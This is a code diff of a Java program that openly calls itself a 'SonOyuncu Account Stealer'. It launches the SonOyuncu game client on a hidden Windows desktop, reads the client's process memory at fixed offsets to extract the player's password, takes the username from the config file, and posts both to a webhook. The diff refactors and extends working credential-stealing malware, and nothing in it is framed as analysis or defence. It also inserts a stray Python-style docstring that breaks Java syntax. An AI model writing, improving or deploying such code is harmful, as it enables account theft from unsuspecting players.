@@ -1,4 +1,5 @@
 import java.io.File;
+import java.io.IOException;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Paths;
@@ -14,8 +15,9 @@ import com.sun.jna.platform.win32.Kernel32;
 import com.sun.jna.platform.win32.User32;
 import com.sun.jna.platform.win32.WinBase.PROCESS_INFORMATION;
 import com.sun.jna.platform.win32.WinBase.STARTUPINFO;
-import com.sun.jna.platform.win32.WinDef.WORD;
 import com.sun.jna.platform.win32.WinNT.HANDLE;
+//import com.sun.jna.platform.win32.WinDef.WORD; Wrong İmport :D
+import com.sun.jna.platform.win32.WinDef.WORD;
 import com.sun.jna.ptr.IntByReference;
 import com.sun.jna.win32.W32APIOptions;
 
@@ -26,18 +28,24 @@ import org.apache.http.impl.client.HttpClients;
 
 /**
  * @author: ItzGonza & Fantasy
- * @version: 2.0
- * @date: 2025-04-14
+ * @contributor: Fatih1963
+ * @version: 2.1
+ * @date: 2025-06-29
  */
-public class Main {
 
+"""
+@author: ItzGonza
+@contributor: fatih1963
+@version: 2.1
+@date: 2025-06-29
+"""
+public class Main {
     private static final String APPLICATION_PATH = System.getenv("APPDATA") + "/.sonoyuncu/sonoyuncuclient.exe";
     private static final String CONFIG_PATH = System.getenv("APPDATA") + "/.sonoyuncu/config.json";
-    private static final String WEBHOOK_URL = "UR_WEBHOOK_URL";
+    private static final String WEBHOOK_URL = "UR_URL_HERE";
 
     private User32 user32;
     private Kernel32 kernel32;
-
     private String desktopName;
     private HANDLE hiddenDesktop;
     private PROCESS_INFORMATION processInfo;
@@ -68,30 +76,23 @@ public class Main {
         startupInfo.lpDesktop = desktopName;
 
         PROCESS_INFORMATION processInfo = new PROCESS_INFORMATION();
-
         if (!((ExtendedKernel32) kernel32).CreateProcessW(null, APPLICATION_PATH, null, null, false, 0x08000000, null, null, startupInfo, processInfo)) {
             ((ExtendedUser32) user32).CloseDesktop(this.hiddenDesktop);
             return null;
         }
-
         return processInfo;
     }
 
     private void cleanup(int processId) {
         try {
-            Process taskkill = new ProcessBuilder("taskkill", "/F", "/PID", String.valueOf(processId)).start();
-            taskkill.waitFor();
-
-            if (processInfo != null) {
-                kernel32.CloseHandle(processInfo.hProcess);
-                kernel32.CloseHandle(processInfo.hThread);
-            }
-
-            if (hiddenDesktop != null) {
-                ((ExtendedUser32) user32).CloseDesktop(hiddenDesktop);
-}
-        } catch (Exception e) {
-            e.printStackTrace();
+            new ProcessBuilder("taskkill", "/F", "/PID", String.valueOf(processId)).start().waitFor();
+        } catch (Exception ignored) {}
+        if (processInfo != null) {
+            kernel32.CloseHandle(processInfo.hProcess);
+            kernel32.CloseHandle(processInfo.hThread);
+        }
+        if (hiddenDesktop != null) {
+            ((ExtendedUser32) user32).CloseDesktop(hiddenDesktop);
         }
     }
 
@@ -105,7 +106,6 @@ public class Main {
             try {
                 if (!kernel32.ReadProcessMemory(hProcess, new Pointer(address), memory, size, bytesRead))
                     return null;
-
                 memory.read(0, buffer, 0, size);
                 return buffer;
             } finally {
@@ -117,57 +117,57 @@ public class Main {
 
     private long getModuleBaseAddress(int processId) {
         try {
-            Process process = new ProcessBuilder(
-                    "powershell",
+            Process process = new ProcessBuilder("powershell",
                     "-Command",
-                    "Add-Type -AssemblyName System.Diagnostics.Process; " +
-                            "$process = [System.Diagnostics.Process]::GetProcessById(" + processId + "); " +
-                            "$module = $process.Modules | Where-Object { $_.ModuleName -eq 'sonoyuncuclient.exe' }; " +
-                            "if ($module) { $module.BaseAddress.ToInt64() } else { 0 }"
+                    "$m = (Get-Process -Id " + processId + ").Modules | Where-Object { $_.ModuleName -eq 'sonoyuncuclient.exe' }; " +
+                            "if ($m) { $m.BaseAddress.ToInt64() } else { 0 }"
             ).start();
 
-            StringBuilder sb = new StringBuilder();
-            byte[] buffer = new byte[1024];
-            int bytesRead;
-            while ((bytesRead = process.getInputStream().read(buffer)) != -1) {
-                sb.append(new String(buffer, 0, bytesRead));
-            }
+            String output = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8).trim();
             process.waitFor();
-
-            return Long.parseLong(sb.toString().trim());
+            return Long.parseLong(output);
         } catch (Exception e) {
-            e.printStackTrace();
+            return 0;
         }
-        return 0;
     }
 
     private String[] extractMemoryCredentials(int processId) {
+        long[] offsets = {0x1CA9B0L, 0x1CA900L, 0x1CAA00L, 0x1CA800L, 0x1CAB00L};
         long startTime = System.currentTimeMillis();
 
-        while (System.currentTimeMillis() - startTime < 10000) {
-            try {
-                long baseAddress = getModuleBaseAddress(processId);
-                if (baseAddress == 0)
-                    continue;
+        while (System.currentTimeMillis() - startTime < 15000) {
+            long baseAddress = getModuleBaseAddress(processId);
+            if (baseAddress == 0) continue;
 
-                byte[] memoryData = readProcessMemory(processId, baseAddress + 0x1C6900, 100);
-                if (memoryData == null)
-                    continue;
+            for (long offset : offsets) {
+                byte[] memory = readProcessMemory(processId, baseAddress + offset, 512);
+                if (memory == null) continue;
 
-                Pattern pattern = Pattern.compile("[A-Za-z0-9._\\-@+#$%^&*=!?~'\\\",\\\\|/:<>\\[\\]{}()]{1,128}");
-                Matcher matcher = pattern.matcher(new String(memoryData, StandardCharsets.UTF_8));
-
-                if (matcher.find()) {
-                    String jsonContent = new String(Files.readAllBytes(Paths.get(CONFIG_PATH)));
-
-                    String username = new Gson().fromJson(jsonContent, JsonObject.class).get("userName").getAsString();
-                    String password = matcher.group(0);
-
-                    return new String[] {username, password};
+                StringBuilder clean = new StringBuilder();
+                for (byte b : memory) {
+                    int value = b & 0xFF;
+                    if (value >= 32 && value <= 126) {
+                        clean.append((char) value);
+                    } else if (value == 0 && clean.length() > 0) {
+                        break;
+                    }
                 }
-            } catch (Exception e) {
-                e.printStackTrace();
+
+                if (clean.length() > 0) {
+                    Matcher matcher = Pattern.compile("[A-Za-z0-9._\\-@+#$%^&*=!?~'\",\\\\|/:<>\\[\\]{}()]{3,64}").matcher(clean.toString());
+                    if (matcher.find()) {
+                        try {
+                            String json = Files.readString(Paths.get(CONFIG_PATH));
+                            String username = new Gson().fromJson(json, JsonObject.class).get("userName").getAsString();
+                            return new String[]{username, matcher.group()};
+                        } catch (IOException ignored) {}
+                    }
+                }
             }
+
+            try {
+                Thread.sleep(500);
+            } catch (InterruptedException ignored) {}
         }
         return null;
     }
@@ -176,9 +176,7 @@ public class Main {
         try {
             this.hiddenDesktop = ((ExtendedUser32) user32).CreateDesktopW(desktopName, null, null, 0, 0x00000002 | 0x00000080 | 0x00000001 | 0x10000000, null);
             this.processInfo = launchApplication();
-            if (this.processInfo == null)
-                return null;
-
+            if (this.processInfo == null) return null;
             return extractMemoryCredentials(processInfo.dwProcessId.intValue());
         } finally {
             if (processInfo != null) {
@@ -188,53 +186,37 @@ public class Main {
     }
 
     private static boolean sendWebhook(String[] credentials) {
-        if (credentials == null)
-            return false;
+        if (credentials == null) return false;
 
-        try {
-            CloseableHttpClient client = HttpClients.createDefault();
+        try (CloseableHttpClient client = HttpClients.createDefault()) {
             HttpPost request = new HttpPost(WEBHOOK_URL);
-
             String json = String.format(
                     "{" +
                             "\"username\": \"hrsz\"," +
-                            "\"embeds\": [" +
-                            "  {" +
-                            "    \"title\": \"SonOyuncu Account Stealer :dash:\"," +
-                            "    \"color\": 65505," +
-                            "    \"description\": \"a new bait has been spotted :woozy_face:\\n\\n" +
-                            ":small_blue_diamond:Username **%s**\\n" +
-                            ":small_blue_diamond:Password **%s**\"," +
-                            "    \"thumbnail\": {" +
-                            "      \"url\": \"https://www.minotar.net/avatar/%s\"" +
-                            "    }," +
-                            "    \"footer\": {" +
-                            "      \"text\": \"github.com/itzgonza\"," +
-                            "      \"icon_url\": \"https://avatars.githubusercontent.com/u/61884903\"" +
-                            "    }" +
-                            "  }" +
-                            "]" +
-                            "}", credentials[0], credentials[1], credentials[0]);
-
+                            "\"embeds\": [{" +
+                            "\"title\": \"SonOyuncu Account Stealer\"," +
+                            "\"color\": 65505," +
+                            "\"description\": \"Username: **%s**\\nPassword: **%s**\"," +
+                            "\"thumbnail\": {\"url\": \"https://www.minotar.net/avatar/%s\"}," +
+                            "\"footer\": {\"text\": \"github.com/itzgonza\",\"icon_url\": \"https://avatars.githubusercontent.com/u/61884903\"}" +
+                            "}]}",
+                    credentials[0], credentials[1], credentials[0]
+            );
             request.setEntity(new StringEntity(json));
             request.setHeader("Content-Type", "application/json");
-
             return client.execute(request).getStatusLine().getStatusCode() == 204;
         } catch (Exception e) {
-            e.printStackTrace();
+            return false;
         }
-        return false;
     }
 
     public static void main(String[] args) {
         if (new File(APPLICATION_PATH).exists()) {
             Main stealer = new Main();
-            String[] credentials = stealer.extractCredentials();
-
-            if (sendWebhook(credentials)) {
-                System.out.println("succesfully ~> " + credentials[0] + ":" + credentials[1]);
+            String[] creds = stealer.extractCredentials();
+            if (sendWebhook(creds)) {
+                System.out.println("successfully ~> " + creds[0] + ":" + creds[1]);
             }
         }
     }
-
 }
